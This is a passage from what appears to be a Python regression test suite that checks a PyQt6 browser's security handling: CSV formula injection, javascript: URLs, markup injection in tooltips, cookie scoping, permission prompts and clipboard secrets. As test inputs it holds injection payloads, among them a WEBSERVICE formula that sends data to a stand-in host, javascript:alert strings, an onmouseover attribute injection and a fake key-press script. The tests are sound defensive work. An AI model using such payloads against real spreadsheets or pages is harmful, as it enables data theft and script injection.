      br.config["formHistory"] == {"shop.example": {"city": ["Berlin"]}},
      str(br.config["formHistory"]))
br.config["formDrafts"] = {}
br.config["formHistory"] = {}

# an http login box belongs to the page in the tab, not to a picture
# another site pulled in from that host
_asked_auth = []
_real_get = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(
    lambda *a, **k: (_asked_auth.append(1), ("", False))[1])
_pw_was = br.config.get(B.VAULT_PASSWORD_KEY, True)
br.config[B.VAULT_PASSWORD_KEY] = True
br.vault.set_entry("localhost", "http", "ada", "letmein")
br._auth_tried = {}
v14 = br.new_tab(); H.spin(300)
H.load(v14, srv.url("/imgauth")); H.spin(2000)
check("another site's frame gets no saved login",
      not any("/auth/" in k for k in br._auth_tried), str(br._auth_tried))
check("...and puts up no dialog", _asked_auth == [], str(_asked_auth))
H.load(v14, srv.url("/auth/panel", host="localhost"))
H.wait_for(lambda: "you are in" in (H.js(v14, "document.body.innerText")
                                    or ""), 8000)
check("the tab's own page still gets the saved login, with no dialog",
      "you are in" in (H.js(v14, "document.body.innerText") or "")
      and _asked_auth == [],
      str(((H.js(v14, "document.body.innerText") or "")[:30], _asked_auth)))
B.QInputDialog.getText = _real_get
br.config[B.VAULT_PASSWORD_KEY] = _pw_was

# exported tables carry no cell a spreadsheet would run
import csv as _csv
_xdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.export_history(str(_xdir / "h.csv"), "csv", rows=[
    {"t": 0, "title": '=WEBSERVICE("http://x.invalid/?"&C2)',
     "url": "https://a.example/", "s": "main"}])
_cells = list(_csv.reader(open(str(_xdir / "h.csv"), encoding="utf-8")))
check("history export: a page title cannot be a formula",
      _cells[1][1].startswith("'="), str(_cells))
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": "x", "name": "+cmd.csv", "url": "https://a/",
                    "from": "", "size": 1, "t": 0, "state": "done"}]
br.export_downloads(str(_xdir / "d.csv"))
br.downloads[:] = _dl_was
_cells = list(_csv.reader(open(str(_xdir / "d.csv"), encoding="utf-8")))
check("downloads export: a file name cannot be a formula",
      _cells[1][0] == "'+cmd.csv", str(_cells))

# opening a downloaded .jar runs it (Java takes it from xdg-open): asked
# first, from the downloads page's Open as much as from the menu
(_xdir / "mod.jar").write_bytes(b"PK not really")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 991, "name": "mod.jar", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_q, _opened = [], []
_real_q = B.QMessageBox.question
_real_open = B.QDesktopServices.openUrl
_real_popen = B.subprocess.Popen
B.QMessageBox.question = staticmethod(
    lambda *a, **k: (_q.append(1), B.QMessageBox.StandardButton.No)[1])
B.QDesktopServices.openUrl = staticmethod(lambda u: _opened.append(u))
B.subprocess.Popen = lambda *a, **k: _opened.append(a)
br.open_download(991)
br.open_download_file(991)
B.QMessageBox.question = _real_q
B.QDesktopServices.openUrl = _real_open
B.subprocess.Popen = _real_popen
br.downloads[:] = _dl_was
check("a downloaded .jar is not run without a yes, from either Open",
      _q == [1, 1] and _opened == [], str((_q, _opened)))

# taking files out of an archive never writes over his own
import zipfile as _zf
(_xdir / "readme.txt").write_text("mine")
with _zf.ZipFile(str(_xdir / "pack.zip"), "w") as z:
    z.writestr("inner/readme.txt", "theirs")
_one = br.archive_file(str(_xdir / "pack.zip"), "inner/readme.txt")
check("one file out of an archive leaves the file already there alone",
      (_xdir / "readme.txt").read_text() == "mine" and _one
      and _Path(_one).read_text() == "theirs", str(_one))
_first = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
(_Path(_first) / "inner" / "readme.txt").write_text("edited by him")
_second = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
check("unpacking again goes into a new folder, not over his edits",
      _second and _second != _first
      and (_Path(_first) / "inner" / "readme.txt").read_text()
      == "edited by him", str((_first, _second)))

# "strip metadata" strips it: no comment, no XMP with a GPS position
_img = B.QImage(8, 8, B.QImage.Format.Format_RGB32)
_img.fill(B.QColor("red"))
_img.setText("Comment", "secret-comment")
_img.setText("XML:com.adobe.xmp", "<x><exif:GPSLatitude>52,31.0N"
             "</exif:GPSLatitude></x>")
_img.save(str(_xdir / "snap.png"), "PNG")
_png = br.strip_metadata(str(_xdir / "snap.png"))
_jpg = br.strip_metadata(str(_xdir / "snap.png"), into="jpg")
_back = B.QImage(_png)
check("stripped picture: no text keys left",
      _png and _back.textKeys() == [], str(_back.textKeys()))
check("...and none written into a JPEG either",
      _jpg and b"GPSLatitude" not in open(_jpg, "rb").read()
      and b"secret-comment" not in open(_jpg, "rb").read())
check("...with the same pixels", _back.pixelColor(3, 3) == B.QColor("red"),
      str(_back.pixelColor(3, 3).name()))
check("a PNG with only a text chunk counts as carrying metadata",
      br.image_has_metadata(str(_xdir / "snap.png")))
check("...and the stripped copy as carrying none",
      not br.image_has_metadata(_png))
(_xdir / "pic.png").write_bytes(b"his own picture")
_img.save(str(_xdir / "pic.bmp"), "BMP")
_conv = br.convert_image(str(_xdir / "pic.bmp"), into="png")
check("converting never replaces a file already there",
      (_xdir / "pic.png").read_bytes() == b"his own picture"
      and _conv and _conv != str(_xdir / "pic.png"), str(_conv))

# yt-dlp finishes even when it talks a lot, and a private tab's video
# is not written into the downloads list
import os as _os, stat as _stat
_bin = _xdir / "bin"
_bin.mkdir()
(_bin / "yt-dlp").write_text("#!/bin/sh\nhead -c 300000 /dev/zero "
                             "| tr '\\0' x\nexit 0\n")
(_bin / "yt-dlp").chmod(0o755)
_path_was = _os.environ.get("PATH", "")
_os.environ["PATH"] = str(_bin) + ":" + _path_was
br.config["downloadDir"] = str(_xdir)
_said_dl = []
br.save_with_ytdlp(url="https://video.example/v", view=v14,
                   then=_said_dl.append)
H.wait_for(lambda: _said_dl, 15000)
check("a chatty yt-dlp still finishes", _said_dl == ["done"], str(_said_dl))
_pv = br.new_private_tab(); H.spin(400)
_rows_before = len(br.downloads)
_said_dl2 = []
br.save_with_ytdlp(url="https://video.example/secret", view=_pv,
                   then=_said_dl2.append)
H.wait_for(lambda: _said_dl2, 15000)
check("a private tab's video leaves no row in the downloads list",
      len(br.downloads) == _rows_before
      and not any("secret" in str(e.get("url")) for e in br.downloads),
      str(len(br.downloads) - _rows_before))
_os.environ["PATH"] = _path_was

# saving a page as a file never replaces one already there, and a
# private tab's page is saved without a row in the list
br.config["downloadDir"] = str(_xdir)
(_xdir / "other.md").write_text("his own notes")
v15 = br.new_tab(); H.spin(300)
H.load(v15, srv.url("/twother")); H.spin(600)
_md = []
br.save_page_markdown(view=v15, then=_md.append)
H.wait_for(lambda: _md, 6000)
check("a saved page does not replace his file of the same name",
      (_xdir / "other.md").read_text() == "his own notes" and _md
      and _md[0].endswith("other (1).md"), str(_md))
H.load(_pv, srv.url("/twother")); H.spin(800)
_rows_before = len(br.downloads)
_md2 = []
br.save_page_markdown(view=_pv, then=_md2.append)
H.wait_for(lambda: _md2, 6000)
check("a private tab's saved page is not written into the list",
      _md2 and _md2[0] and len(br.downloads) == _rows_before,
      str((_md2, len(br.downloads) - _rows_before)))

# the address bar's "whole address" tooltip shows the address, not what
# its decoded letters spell out as markup
_long = ("https://e.example/" + "x" * 300
         + "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
br.show_address(_long)
_tip = br.urlbar.toolTip()
from PyQt6.QtGui import QTextDocument as _QTD
_doc = _QTD()
_doc.setHtml(_tip)
check("the long-address tooltip is plain text",
      "<h1>https://bank.example</h1>" in _doc.toPlainText()
      and "<h1>" not in _tip, _tip[-80:])
check("an empty tooltip stays empty", B.literal("") == "")

# the lock menu lists this site's permissions, not every site whose
# name contains this one's
_perm_was = br.config.get("permissions")
br.config["permissions"] = {"http://127.0.0.1:1|camera": "allow",
                            "https://x127.0.0.1.example|mic": "allow"}
_facts = br.site_info(v15)
check("site info: only this host's grants",
      list(_facts.get("permissions", {})) == ["http://127.0.0.1:1|camera"],
      str(_facts.get("permissions")))
br.config["permissions"] = _perm_was

# a site's search template is a web address or nothing
check("a javascript: search template is refused",
      br.note_opensearch("evil.example", "x",
                         "javascript:alert(1)//{searchTerms}") is False
      and "evil.example" not in br.opensearch_table())
check("an https one is kept",
      br.note_opensearch("good.example", "g",
                         "https://good.example/?q={searchTerms}") is True)
br.opensearch_table().pop("good.example", None)

# the cookie editor: one site's cookies, one jar, and a delete that
# reaches the engine
def _ck(name, value, domain):
    c = B.QNetworkCookie(name.encode(), value.encode())
    c.setDomain(domain)
    c.setPath("/")
    return c
v16 = br.new_tab(); H.spin(300)
H.load(v16, srv.url("/twhome")); H.spin(400)
_jar = br._view_jar(v16)
br._note_cookie(_ck("sess", "netflix-session", ".netflix.com"), jar=_jar)
br._note_cookie(_ck("xs", "x-own", ".x.com"), jar=_jar)
br._note_cookie(_ck("priv", "private-one", ".x.com"), jar="private")
_names = sorted(r["name"] for r in br.site_cookies("x.com"))
check("x.com's cookies are x.com's, from this jar only", _names == ["xs"],
      str(_names))
_txt = br.cookies_txt("x.com", str(_xdir / "cookies.txt"))
_body = open(_txt).read() if _txt else ""
check("...and so is its cookies.txt",
      "x-own" in _body and "netflix-session" not in _body
      and "private-one" not in _body, _body[-200:])
H.load(v16, srv.url("/setck")); H.spin(1200)
check("a page cookie is there to delete",
      "srv=1" in str(H.js(v16, "document.cookie")))
check("deleting it from the editor says so",
      br.delete_cookie("srv", "127.0.0.1", "/") is True)
H.spin(800)
check("...and the page no longer has it",
      "srv=1" not in str(H.js(v16, "document.cookie")),
      str(H.js(v16, "document.cookie")))

# a jar made after start-up (the private one here) has the same
# interceptor: blocked addresses stay blocked, and its requests stay
# out of the request log. (An earlier block closed this window's last
# tab, which closes the window and runs the exit clean-up that hands the
# interceptor back; asking again puts it back on every jar.)
br.request_watch()
br.config["urlRules"] = "/blockme"
v17 = br.new_tab(); H.spin(300)
H.load(v17, srv.url("/blockme")); H.spin(800)
check("a blocked address is blocked in a normal tab",
      H.js(v17, "!!document.getElementById('b')") is not True)
H.load(_pv, srv.url("/blockme")); H.spin(800)
check("...and in a private tab, whose jar came later",
      H.js(_pv, "!!document.getElementById('b')") is not True)
_vb = br.new_tab(session="reviewvb"); H.spin(300)
H.load(_vb, srv.url("/blockme")); H.spin(800)
check("...and in a virtual browser made after that",
      _vb.page().profile() is not br.profile
      and H.js(_vb, "!!document.getElementById('b')") is not True)
br.config["urlRules"] = ""
br.log_requests(True)
H.load(_pv, srv.url("/twother?private-visit")); H.spin(800)
H.load(v17, srv.url("/twother?normal-visit")); H.spin(800)
_urls = [r["url"] for r in br.request_rows()]
br.log_requests(False)
check("the request log has the normal tab's request",
      any("normal-visit" in u for u in _urls), str(_urls[:4]))
check("...and not the private one's",
      not any("private-visit" in u for u in _urls), str(_urls[:4]))

# a virus scan runs beside the window, not on it
(_bin / "clamscan").write_text("#!/bin/sh\nsleep 1.5\nexit 1\n")
(_bin / "clamscan").chmod(0o755)
_os.environ["PATH"] = str(_bin) + ":" + _path_was
(_xdir / "scanme.bin").write_bytes(b"x")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 992, "name": "scanme.bin", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_scan = []
_t0 = _time.time()
br.scan_download(992, then=_scan.append)
_took = _time.time() - _t0
check("starting a scan does not hold the window", _took < 0.5,
      "%.2fs" % _took)
H.wait_for(lambda: _scan, 8000)
check("...and its answer still arrives", _scan == ["infected"], str(_scan))
br.downloads[:] = _dl_was
_os.environ["PATH"] = _path_was

# pages the browser builds out of text run no script
v18 = br.new_tab(); H.spin(300)
br.show_html("<!doctype html><title>t</title><script>document.title="
             "'ran'</script><a id=l href=\"javascript:document.title="
             "'clicked'\">x</a>", view=v18)
H.spin(600)
H.js(v18, "document.getElementById('l').click(); 1"); H.spin(400)
check("a built page's script and javascript: link stay dead",
      H.js(v18, "document.title") == "t", str(H.js(v18, "document.title")))
_mm = br.minimessage_html('<gradient:red" onmouseover="alert(1):blue>hi')
check("a MiniMessage gradient cannot write an attribute",
      'onmouseover="' not in _mm and "<span" not in _mm, _mm[-160:])
check("...while a real one still draws",
      "linear-gradient(90deg,#ff5555,#5555ff)"
      in br.minimessage_html("<gradient:red:blue>hi"))
H.load(v18, srv.url("/twhome")); H.spin(500)
br.override_place(view=v18, zone="Asia/Kolkata"); H.spin(300)
check("a half-hour time zone is told as one",
      H.js(v18, "new Date().getTimezoneOffset()") == -330,
      str(H.js(v18, "new Date().getTimezoneOffset()")))
br.responsive_preview("phone", view=v18)
def _all_actions(m):
    for a in m.actions():
        yield a
        if a.menu() is not None:
            yield from _all_actions(a.menu())
_off = [a for a in _all_actions(br.dev_menu())
        if a.text() == br._ui_str("devSizeOff")]
if _off:
    _off[0].trigger()
check("the dev menu's size off gives the tab its size back",
      _off and v18.maximumWidth() == 16777215, str(v18.maximumWidth()))
br.request_watch().log[:] = [{"url": "https://a/", "host": "a",
                              "method": "GET", "kind": 0, "t": 0}]
_har = br.export_har(str(_xdir / "r.har"))
check("a HAR's times are UTC, as its Z says",
      '"1970-01-01T00:00:00Z"' in open(_har).read() if _har else False)
br.request_watch().log[:] = []
check("a typed javascript: address is searched for, never run",
      not br._resolve_typed("javascript://%0aalert(1)").lower()
      .startswith("javascript"), br._resolve_typed("javascript://%0aalert(1)"))

# Sec-GPC goes out with ad blocking off, too
br.config["adBlock"] = False
_gkey = B.Browser.GUARD_KEY.get("gpc") if hasattr(B.Browser, "GUARD_KEY") \
    else None
if _gkey and B.page_guard is not None:
    _gpc_was = br.config.get(_gkey)
    br.config[_gkey] = True
    H.load(v18, srv.url("/echo")); H.spin(800)
    _hdrs = str(H.js(v18, "document.body.innerText"))
    check("with the GPC guard on, Sec-GPC is sent (ad blocking off)",
          "sec-gpc: 1" in _hdrs.lower(), _hdrs[:300])
    br.config[_gkey] = _gpc_was

# "allow this time" is this time: the engine does not write it down
# behind the browser's back, and the next visit asks again
from PyQt6.QtWebEngineCore import QWebEnginePermission as _QWP
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card = getattr(br, "_perm_widget", None)
_once = _card.findChild(B.QToolButton, "permonce") if _card is not None \
    else None
check("a site asking for notifications gets a card with 'this time'",
      _once is not None)
if _once is not None:
    _once.click(); H.spin(800)
check("...and 'this time' answers it", H.js(v19, "window.asked") == "granted",
      str(H.js(v19, "window.asked")))
_st = br.profile.queryPermission(
    B.QUrl(srv.url("/")), _QWP.PermissionType.Notifications).state()
check("the engine keeps no grant of its own after 'this time'",
      _st != _QWP.State.Granted, str(_st))
br._perm_widget = None
br.close_tab(br.tabs.indexOf(v19), ask=False); H.spin(500)
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card2 = getattr(br, "_perm_widget", None)
check("...so the next visit, in a new tab, asks again",
      _card2 is not None and H.js(v19, "window.asked") == "",
      str((H.js(v19, "window.asked"), _card2)))
if _card2 is not None:
    _deny = _card2.findChild(B.QToolButton, "permdeny")
    if _deny is not None:
        _deny.click(); H.spin(400)

# the status line shows where a link goes as text, never as markup
br.show_hovered_link("https://www.google.com/url?q=https://x.example/"
                     "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
_hl = getattr(br, "_hoverlbl", None)
check("the status line is plain text",
      _hl is not None and _hl.textFormat() == B.Qt.TextFormat.PlainText
      and "<h1>" in _hl.text(), _hl.text() if _hl is not None else None)

# a certificate exception is that certificate, or nothing
br.config["certExceptions"] = {"legacy.lan": True}
check("an old catch-all exception no longer passes any certificate",
      br.certificate_excepted("legacy.lan", "ab" * 32) is False)
check("...though the host still shows as having one",
      br.certificate_excepted("legacy.lan") is True)
check("a yes with no certificate to pin is not kept",
      br.trust_certificate("nofp.lan", "") is False
      and "nofp.lan" not in br.certificate_exceptions())
br.config["certExceptions"] = {}

# menu entries whose lambda took the "checked" flag as their argument
br.tabs.setCurrentWidget(v15); H.spin(200)
_got = []
_sc, _scn = br.show_certificate, br.show_connection
br.show_certificate = lambda h=None: _got.append(("cert", h))
br.show_connection = lambda h=None: _got.append(("conn", h))
for _a in br.certificate_menu().actions():
    if _a.text() in (br._ui_str("certShow") % "127.0.0.1",
                     br._ui_str("connDetails")):
        _a.trigger()
br.show_certificate, br.show_connection = _sc, _scn
check("the lock menu's certificate and connection entries get the host",
      _got == [("cert", "127.0.0.1"), ("conn", "127.0.0.1")], str(_got))

# a locked window's title says nothing about the page behind the cover
br.set_browser_lock("review-lock")
br._sync_window_title()
_was_title = br.windowTitle()
br.lock_browser()
check("a locked window's title hides the page's",
      "other" in _was_title and "other" not in br.windowTitle(),
      str((_was_title, br.windowTitle())))
br.unlock_browser()
check("...and unlocking brings it back", "other" in br.windowTitle(),
      br.windowTitle())
br.set_browser_lock("")

# a secret the browser copies stays out of clip histories, its own and
# the desktop's
br.watch_clipboard(True)
br._copy_secret_text("hunter2-review")
H.spin(300)
_md = B.QGuiApplication.clipboard().mimeData()
check("a copied secret carries the desktop's 'do not keep' hint",
      _md is not None and bytes(_md.data("x-kde-passwordManagerHint"))
      == b"secret")
_clips = [c["text"] for c in (br.desk().clips() if br.desk() else [])]
check("...and is not in the browser's clip history",
      "hunter2-review" not in _clips, str(_clips[:3]))
br.watch_clipboard(False)

# a page cannot make the snippet expander type out a snippet for it
_drawer = br.desk()
if _drawer is not None:
    _drawer.set_snippet("zqsnip", "SECRET-SNIPPET-TEXT")
    br.config["snippets"] = True
    br.refresh_snippet_script()
    v20 = br.new_tab(); H.spin(300)
    H.load(v20, srv.url("/drafts")); H.spin(800)
    H.js(v20, "var f=document.getElementById('n'); f.focus();"
              "f.value='zqsnip '; f.setSelectionRange(7,7);"
              "f.dispatchEvent(new KeyboardEvent('keyup',"
              "{key:' ',bubbles:true})); 1")
    H.spin(300)
    check("a page's own fake key press does not expand a snippet",
          "SECRET" not in str(H.js(v20, "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    H.js(v20, "var f=document.getElementById('n'); f.value=''; f.focus(); 1")
    v20.setFocus(); H.spin(100)
    H.type_text(v20, "zqsnip ")
    H.spin(300)
    check("...while real typing still does",
          "SECRET-SNIPPET-TEXT" in str(H.js(v20,
                                           "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    _drawer.set_snippet("zqsnip", "")
    br.refresh_snippet_script()

bad = [n for ok, n in RESULTS if not ok]
print("%d checks, %d failed" % (len(RESULTS), len(bad)))
for n in bad:
    print("  FAILED:", n)
sys.stdout.flush()
H.os._exit(1 if bad else 0) if hasattr(H, "os") else sys.exit(1 if bad else 0)
